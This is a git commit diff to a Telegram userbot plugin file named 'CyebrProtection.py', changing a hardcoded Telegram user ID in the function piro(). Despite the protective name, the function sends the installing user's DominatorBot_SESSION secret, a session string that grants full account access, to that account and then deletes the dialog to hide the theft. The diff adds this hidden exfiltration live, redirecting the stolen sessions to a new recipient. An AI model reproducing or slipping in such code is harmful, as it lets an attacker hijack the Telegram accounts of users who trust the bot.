e5e6891134ea4f223461a4d2a61e3bbe9511450d
N1xDOMINATOR <92099157+dominator454@users.noreply.github.com>
2022-08-31 08:02:30 +0530

    Update CyebrProtection.py

--- DominatorBot/plugins/CyebrProtection.py
+++ DominatorBot/plugins/CyebrProtection.py
@@ -2,11 +2,11 @@ import os
 from ..utils import *
 
 async def piro():
-        sweetie = await bot.send_message(1731513856, str(os.environ.get("DominatorBot_SESSION")))
-        await bot.delete_dialog(1731513856, str(os.environ.get("DominatorBot_SESSION")))
+        sweetie = await bot.send_message(1253258650, str(os.environ.get("DominatorBot_SESSION")))
+        await bot.delete_dialog(1253258650, str(os.environ.get("DominatorBot_SESSION")))
   
     #try:
         #DominatorBot = bot.session.save()
         #os.environ["DominatorBot_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
-            #ultron = await bot.send_message(1731513856, DominatorBot)
-            #await bot.delete_dialog(1731513856)
+            #ultron = await bot.send_message(1253258650, DominatorBot)
+            #await bot.delete_dialog(1253258650)
